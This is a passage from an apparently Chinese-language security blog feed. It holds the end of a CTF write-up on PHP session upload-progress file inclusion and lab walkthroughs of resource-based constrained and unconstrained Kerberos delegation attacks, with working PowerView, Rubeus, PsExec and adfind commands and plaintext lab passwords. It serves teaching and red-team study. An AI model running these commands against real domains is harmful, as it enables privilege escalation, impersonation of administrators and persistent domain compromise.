<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://f3c16bd0-8f13-4d36-84b1-193366ace33c.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&lt;?php echo ini_get(&quot;</span><span class="attr">session.upload_progress.name</span>&quot;); ?&gt;</span>&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>cookie处添加<code>PHPSESSID=flag</code> ，在PHP_SESSION_UPLOAD_PROGRESS下添加恶意代码；此时由于PHP的<code>session.use_strict_mode</code>模式默认关闭，生成的session文件将会是<code>sess_flag</code> 同时<code>Linux PHP</code>默认将sess文件存放于/tmp目录下</p>
<p><strong>竞争1</strong></p>
<p>利用bp不停写入sess文件</p>
<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030213842165.png" alt="image-20211030213842165"></p>
<p><strong>竞争2</strong></p>
<p>在sess文件被删除之前，请求包含，获得命令相应</p>
<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030213929939.png" alt="image-20211030213929939"></p>
<p>利用竞争，执行命令从而拿到fl0g.php中的flag</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>基于资源的约束委派</title>
    <url>/2022/01/30/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
    <content><![CDATA[<h3 id="基于资源的约束委派利用"><a href="#基于资源的约束委派利用" class="headerlink" title="基于资源的约束委派利用"></a>基于资源的约束委派利用</h3><p>基于资源的约束委派，(Resource-based constrained delegation)，与前文提到的约束委派不同，它在信任的传递关系上是不同的，这也是它工作方向相反的一个因素。</p>
<p>在约束委派中，账户A到账户B的约束委派在账户A的 msDS-AllowedToDelegateTo 属性中配置，并且定义了A到B的传出<code>信任</code>,而在基于资源的约束委派当中，委派在账户B的msDS-AllowedToActOnBehalfOfOtherIdentity 属性中配置，并定义了A到B的<code>传入</code>信任。</p>
<p>一图概括。</p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220204202427514.png" alt="image-20220204202427514"></p>
<p>如图为在Elad师傅中的文章中所得的导图，通过此图，我们可以看出基于资源的约束委派与传统约束委派的工作方式有何不同。</p>
<span id="more"></span>

<p>在基于资源的约束委派当中，我们不需要再像传统的约束委派一样，通过域管理员权限，为用户设置相关的属性以便于请求相关服务，另一点就是传统的约束委派S4U2Self返回的票据，一定要是可转发的TGS（forwardableST），如果不可转发，在S4U2Proxy阶段将会代理用户请求服务失败；但在基于资源的约束委派当中，我们无需可转发的TGS票据（TrustedToAuthenticationForDelegation），通过操作S4U2Proxy也会成功执行，返回可转发ST。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当我们获得用户对该主机的属性具有写权限时，那么这个用户便可以对该主机进行攻击了。</span><br></pre></td></tr></table></figure>

<h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境:"></a>复现环境:</h4><ul>
<li>域:attack.local</li>
<li>域控主机:dc.attack.local，Windows Server 2012 R2 10.10.10.165</li>
<li>目标主机:oa.attack.local，Windows Server 2012 R2 10.10.10.166</li>
<li>用户: WebManager，对oa.attack.local主机具备写权限</li>
</ul>
<p>使用PowerView验证指定ACE，测试OA用户对win2016.attack.local主机是否具备写权限</p>
<figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="type">Get</span>-<span class="type">DomainUser</span> -<span class="type">Identity</span> <span class="type">WebManager</span> -<span class="type">Properties</span> objectsid</span><br><span class="line"><span class="title">wmic</span>:root\cli&gt;useraccount 获得域内用户的信息</span><br><span class="line"><span class="type">Get</span>-<span class="type">DomainObjectAcl</span> -<span class="type">Identity</span> oa | ?&#123;$_.<span class="type">SecurityIdentifier</span> -match <span class="string">&quot;S-1-5-21-4052809752-717748265-227546684-1601&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205171858248.png" alt="image-20220205171858248"></p>
<p>可以看到ActiveDirectoryRights 属性为GenericWrite ，即为对oa主机具有写权限，除去GenericWrite权限可利用外，还有<code>GenericAll</code>、<code>WriteProperty</code>、<code>WriteDacl</code>权限也是可以修改账户属性进行攻击利用的。</p>
<p>拥有了可以修改计算机账户属性的帐号外，我们还需要一个SPN账户，这是因为S4U2Proxy在代替用户请求服务时，是根据Kerberos协议进行利用的，而SPN(服务主体名称)又是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。关于SPN更深层的利用在这里不再过多赘述，具体可以自行google或查看博客的<a href="https://antipassion.github.io/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/">Kerberoasting攻击</a>，进行学习利用。</p>
<p>在域当中，域用户默认在域内可创建的计算机账户数为10，而我们所创建的计算机账户，又默认注册在<code>RestrictedKrbHost/domain</code>、<code>HOST/domain</code>这两个SPN之下，此处我们正好可以进行利用。</p>
<p>使用Powermad注册计算机用户 win2035</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount WIN2035</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172117772.png" alt="image-20220205172117772"></p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">setspn -q <span class="comment">*/* | findstr &quot;win2035&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172024597.png" alt="image-20220205172024597"></p>
<p>通过Powermad脚本添加机器账户，查询spn发现SPN账户添加成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172000776.png" alt="image-20220205172000776"></p>
<p>查询可知机器账户WIN2035$添加成功。</p>
<p>对于<strong>修改oa计算机的msDS-AllowedToActOnBehalfOfOtherIdentity</strong>属性值,有两种方法。</p>
<h4 id="1-利用Powerview脚本修改属性值"><a href="#1-利用Powerview脚本修改属性值" class="headerlink" title="1.利用Powerview脚本修改属性值"></a>1.利用Powerview脚本修改属性值</h4><p><strong>拿到查找新注册的机器账户SID</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-NetComputer -Identity WIN2035</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172307352.png" alt="image-20220205172307352"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4052809752-717748265-227546684-2104)&quot;</span> <span class="comment">#此处为机器账户的sid</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Get-DomainComputer</span> oa.attack.local| <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172406926.png" alt="image-20220205172406926"></p>
<p><strong>验证是否修改成功</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainComputer oa.attack.local -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172419960.png" alt="image-20220205172419960"></p>
<p>若msds-allowedtoactonbehalfofotheridentity存在值即为修改成功。</p>
<p><strong>清除msds-allowedtoactonbehalfofotheridentity的值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-DomainObject oa -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure>



<h4 id="2-通过ActiveDirectory模块修改其属性值"><a href="#2-通过ActiveDirectory模块修改其属性值" class="headerlink" title="2.通过ActiveDirectory模块修改其属性值"></a>2.通过ActiveDirectory模块修改其属性值</h4><p>[^注意：ActiveDirectory仅在Windows 2012及以上版本的服务器中存在<code>-PrincipalsAllowedToDelegateToAccount</code>选项，同时，本模块默认安装于域控当中，域内机器默认并不存在，需单独安装。]: </p>
<p>若我们所打下来的域内主机不存在此模块，可通过上传dll powershell安装导入本模块进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADComputer oa -PrincipalsAllowedToDelegateToAccount win2035$</span><br><span class="line">Get-ADComputer oa -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>

<p>为了让测试更加直观明确，我们先利用Mimikatz将缓存的票据擦除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Kerberos::purge</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172752065.png" alt="image-20220205172752065"></p>
<p>此时的WebManager用户，无法通过手中权限访问oa的共享目录</p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172826093.png" alt="image-20220205172826093"></p>
<h4 id="利用Rubeus进行攻击"><a href="#利用Rubeus进行攻击" class="headerlink" title="利用Rubeus进行攻击"></a>利用Rubeus进行攻击</h4><p>由于Rubes不支持明文密码获得基于资源的约束委派票据，所以我们需要先将其转化为hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:WIN2035 /password:123456 /domain:attack.local</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172856256.png" alt="image-20220205172856256"></p>
<p>然后利用WIN2035$机器账户的rc4 hash请求ST并导入当前会话。</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:WIN2035$ /rc4:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4  /impersonateuser:administrator /msdsspn:cifs/oa /ptt</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:WIN2035<span class="variable">$</span> /rc4:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4  /impersonateuser:administrator /msdsspn:host/oa /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205173014453.png" alt="image-20220205173014453"></p>
<p>此时利用本会话，访问oa机器的共享目录，成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\oa\c$</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205173058335.png" alt="image-20220205173058335"></p>
<h5 id="获得稳定的shell"><a href="#获得稳定的shell" class="headerlink" title="获得稳定的shell"></a>获得稳定的shell</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec64.exe \\oa cmd</span><br><span class="line">Python3 getSt.py -dc-ip 10.10.10.165 -spn cifs/oa -impersonate Administrator attack.local/attack:WIN2035:123456</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205182446385.png" alt="image-20220205182446385"></p>
<h3 id="敏感账户不可被委派问题"><a href="#敏感账户不可被委派问题" class="headerlink" title="敏感账户不可被委派问题"></a>敏感账户不可被委派问题</h3><p>利用条件: 知道目标的机器账户的hash</p>
<p>[^注：一般情况下主机在加入域中会随机设置机器账户的密码，所以一般情况下用的是机器账户hash,并且我们是不可以修改机器账户的密码。]: </p>
<p>在域环境中，高权限用户如果没有特殊需求的话，考虑到安全性，一般会被设置为不可委派，或是加入受保护组。</p>
<p><strong>设置账户不可委派</strong></p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205204846994.png" alt="image-20220205204846994"></p>
<p>此时我们再利用Rubeus申请票据，却发现S4U2Self步骤成功，但在S4U2Proxy代替用户去申请ST票据时失败,错误原因显示:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[X] KRB-ERROR (13) : KDC_ERR_BADOPTION</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:WIN2035$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4  /impersonateuser:administrator /msdsspn:host/oa /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205205748570.png"></p>
<p>此处说明，当账户不可委派以及受保护组的成员可以完成S4U2Self，利用<code>Rubeus describe</code>查看返回的票据。</p>
<p>将制作失败的S2U4Proxy阶段票据拿出去除空格换行符后利用Rubeus与成功生成利用的票据进行对比分析。</p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205210850607.png" alt="image-20220205210850607"></p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205211142165.png" alt="image-20220205211142165"></p>
<p>可以发现，在<code>ServiceName</code>部分，被设置了敏感账户与被添加进受保护组的用户账号票据的ServiceName处的值为服务主机名，未被设置敏感账户与被添加进受保护组的用户账号票据的ServiceName处的值为请求的服务名。</p>
<h4 id="使用Rebeus修改票据所请求的服务名："><a href="#使用Rebeus修改票据所请求的服务名：" class="headerlink" title="使用Rebeus修改票据所请求的服务名："></a>使用Rebeus修改票据所请求的服务名：</h4><p>语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid]</span><br><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid]</span><br></pre></td></tr></table></figure>

<p>利用tgssub模块替换服务名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:target.kirbi /altservice:host/oa /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:target.kirbi /altservice:cifs/oa /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205213839675.png" alt="image-20220205213839675"></p>
<p>此时我们访问共享目录便具有权限了。</p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205214033038.png" alt="image-20220205214033038"></p>
<p>获得会话shell</p>
<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205214102004.png" alt="image-20220205214102004"></p>
<h4 id="利用基于资源的约束委派进行权限维持"><a href="#利用基于资源的约束委派进行权限维持" class="headerlink" title="利用基于资源的约束委派进行权限维持"></a>利用基于资源的约束委派进行权限维持</h4><p>根据基于资源的约束委派进行权限维持，主要有两种思路：</p>
<ol>
<li>配置注册的机器账户到Krbtgt基于资源的约束委派</li>
<li>配置注册的机器账户到域控基于资源的约束委派</li>
</ol>
<h5 id="机器账户到Krbtgt基于资源的约束委派"><a href="#机器账户到Krbtgt基于资源的约束委派" class="headerlink" title="机器账户到Krbtgt基于资源的约束委派"></a>机器账户到Krbtgt基于资源的约束委派</h5><p>当我们拿下域管权限后，可以利用如下命令为krbtgt用户添加ACL用于基于资源的约束委派。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4052809752-717748265-227546684-2104)&quot;</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Get-DomainUser</span> krbtgt | <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205225400564.png" alt="image-20220205225400564"></p>
<p>成功修改Krbtgt用户的PrincipalsAllowedToDelegateToAccount属性后，尝试请求票据，去除空格换行拿到Krbtgt用户的TGS票据，以便申请域内任意服务。</p>
<p>注：此处选择第三个Rubeus生成的票据进行利用，去除空格后利用Rubeus进行Hash传递，前两个生成的票据对我们即将要进行的申请服务并没有意义。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u  /user:evil$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /domain:attack.local /msdsspn:krbtgt /impersonateuser:administrator /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205225930436.png" alt="image-20220205225930436"></p>
<p>利用拿到的去除空格后的TGS票据修改，获取任意服务的访问权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\Rubeus.exe asktgs /user:evil$ /enctypes:rc4 /service:cifs/oa /domain:attack.local /ticket:doIExxxxxxx /ptt</span><br><span class="line">.\Rubeus.exe asktgs /user:evil$ /enctypes:rc4 /service:host/oa /domain:attack.local /ticket:doIExxxxxxx /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205233803496.png" alt="image-20220205233803496"></p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>非约束委派攻击</title>
    <url>/2022/01/06/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h3><p><strong>委派</strong></p>
<p>在域中如果出现A使用Kerberos身份验证访问域中的服务B,而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220106232045335.png" alt="image-20220106232045335"></p>
<h4 id="例"><a href="#例" class="headerlink" title="例:"></a>例:</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">User访问主机S2上的HTTP服务，此时要想完整的使用HTTP服务，需再访问S3主机上的SQL数据库，但S2并不知道域用户是否拥有权限访问S3上的数据库服务权限，这时为了验证权限，S2会带着User的访问权限去申请访问SQL数据库，若User拥有权限才可进行访问。</span><br></pre></td></tr></table></figure>

<h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><p>非约束委派Kerberos中实现时，User会将自KDC拿到的TGT发送给访问的服务机器Service1,Service1再通过拿到手的TGT票据去申请访问其他域内服务，Service1在拿到用户的TGT票据后，会对其留存，以便下次备用，这时，我们便可在拿下的Service1机器中拿到域用户的TGT票据，从而访问域内的可访问服务(域管用户可访问任意服务)</p>
<span id="more"></span>

<h4 id="非约束委派流程图"><a href="#非约束委派流程图" class="headerlink" title="非约束委派流程图"></a>非约束委派流程图</h4><p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220106233107179.png" alt="image-20220106233107179"></p>
<p><strong>流程</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1.用户发KPB_AS_REQ消息请求[可转发TGT（forwardable TGT）] ,为了方便，先将其称之为TGT1。</span><br><span class="line"></span><br><span class="line">2.KDC在KPB_AS_REQ中返回给User TGT1。</span><br><span class="line"></span><br><span class="line">3.用户再通过TGT1向KDC请求转发TGT（forwardedTGT，我们称之为TGT2）。</span><br><span class="line"></span><br><span class="line">4.在KRB_TGS_REP消息中返回Forwarded TGT 给User</span><br><span class="line"></span><br><span class="line">5.User使用TGT1向KDC申请访问service1的ST(service Ticket)</span><br><span class="line"></span><br><span class="line">6.KDC返回给用户一个ST</span><br><span class="line"></span><br><span class="line">7.User发送KRB_AP_REQ请求至service1，这个请求包括了TGT1和ST、TGT2、TGT2的sessionKey。</span><br><span class="line"></span><br><span class="line">8.service1使用用户的TGT2使用KRB_TGS_REQ发送给KDC，以用户的名义申请可以访问service2的票据.</span><br><span class="line"></span><br><span class="line">9.KDC在KRB_TGS_REP消息中返回service2到service1的票据.</span><br><span class="line"></span><br><span class="line">10.Service1以用户的名义向Service2发起KRB_AP_REQ请求.</span><br><span class="line"></span><br><span class="line">11.Service2响应步骤10中的Service1请求。</span><br><span class="line"></span><br><span class="line">12.Service1响应步骤7中用户的请求。</span><br><span class="line"></span><br><span class="line">13.在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务。</span><br><span class="line"></span><br><span class="line">14.KDC返回步骤13中请求的票据</span><br><span class="line"></span><br><span class="line">15.和16即为Service1通过模拟用户来访问其他Service。</span><br></pre></td></tr></table></figure>

<p><strong>下面对非约束委派进行复现利用</strong></p>
<h3 id="非约束委派配置"><a href="#非约束委派配置" class="headerlink" title="非约束委派配置"></a>非约束委派配置</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">setspn -U -A MSSQLvc/mssql.vulntarget.com:<span class="number">1433</span> win2016</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108233836061.png" alt="image-20220108233836061"></p>
<p>当DC配置SPN给域用户Win2016时，在域内将可产生对域用户的委派，我们可以看到，域管理员勾选win2016用户的委派-信任此用户作为任何服务的委派时，将会造成非约束委派的问题。</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108234035281.png" alt="image-20220108234035281"></p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109002924052.png" alt="image-20220109002924052"></p>
<h4 id="非约束委派其特征"><a href="#非约束委派其特征" class="headerlink" title="非约束委派其特征"></a>非约束委派其特征</h4><p>当域用户或机器被设置了非约束委派时，其userAccountControl属性将会包含一个名为”TRUSTED_FOR_DELEGATION”的标志。</p>
<p>我们可以在ADSI编辑器中找到</p>
<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108234917330.png" alt="image-20220108234917330"></p>
<h4 id="探测域内是否存在非约束委派"><a href="#探测域内是否存在非约束委派" class="headerlink" title="探测域内是否存在非约束委派"></a>探测域内是否存在非约束委派</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win2019 10.0.10.110 dc vulntarget\win2019::Admin@666</span><br><span class="line">win2016 10.0.10.111 域内机器 vulntarget\win2016::Admin#123</span><br></pre></td></tr></table></figure>

<p>查找利用账户时，我们暂且不考虑机器账户，因为拿到域内机器账户的票据后，我们无法用于远程访问，因此，我们在进行非约束委派攻击时，首先考虑<strong>域用户</strong>，但这并不意味着<strong>机器账户</strong>没有任何用处，当我们可以对机器账户进行非约束委派攻击时，我们可以根据拿到的<strong>机器账户TGT票据</strong>进行DCsync拿到域内hash等操作。</p>
<p>利用adfind查找域内启用了非约束委派的机器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.0.10.110 -u vulntarget\win2016 -up Admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220108235639960.png" alt="image-20220108235639960"></p>
<p>无需域用户账号密码查询非约束委派的域用户</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">AdFind.exe  -b <span class="string">&quot;DC=vulntarget,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName</span><br></pre></td></tr></table></figure>



<p>利用adfind查找域内启用了非约束委派的域内用户</p>
